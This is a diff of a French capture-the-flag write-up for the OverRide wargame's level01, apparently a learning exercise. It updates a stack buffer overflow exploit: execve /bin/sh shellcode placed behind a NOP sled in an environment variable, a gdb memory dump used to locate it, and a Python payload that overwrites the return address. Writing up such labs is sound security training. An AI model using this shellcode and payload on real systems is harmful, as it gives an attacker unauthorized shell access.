@@ -119,18 +119,19 @@ De plus on remarque qu'il n'y a pas de system ou execve, on va donc utiliser un 
 Que l'on va stocker dans une variable d'env
 export SHELLCODE=$(python -c 'print "\x90" * 59 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 Pour recuperer l'addresse de ma variable d'env je met un break dans le programme et :
-(gdb) x/s *environ
-0xffffd7bb:	 "LC_PAPER=en_US.UTF-8"
-(gdb)
-0xffffd7d0:	 "LC_ADDRESS=en_US.UTF-8"
-(gdb)
-0xffffd7e7:	 "LC_MONETARY=en_US.UTF-8"
-(gdb)
-0xffffd7ff:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
+(gdb) x/50x *environ
+0xffffd890:	0x53	0x48	0x45	0x4c	0x4c	0x43	0x4f	0x44
+0xffffd898:	0x45	0x3d	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd8a0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd8a8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd8b0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd8b8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
+0xffffd8c0:	0x90	0x90
 
-L'addresse de notre shellcode est donc 0xffffd7ff ou \xff\xd7\xff\xff il nous reste plus qu'a construire notre payload
 
-level01@OverRide:~$ (python -c 'print ("dat_wil\n" + "A"*80 + "\xff\xd7\xff\xff")'; cat) | ./level01
+L'addresse de notre shellcode est donc 0xffffd8a0 ou \xa0\xd8\xff\xff il nous reste plus qu'a construire notre payload
+
+level01@OverRide:~$ (python -c 'print ("dat_wil\n" + "A"*80 + "\xa0\xd8\xff\xff")'; cat) | ./level01
 ********* ADMIN LOGIN PROMPT *********
 Enter Username: verifying username....
 
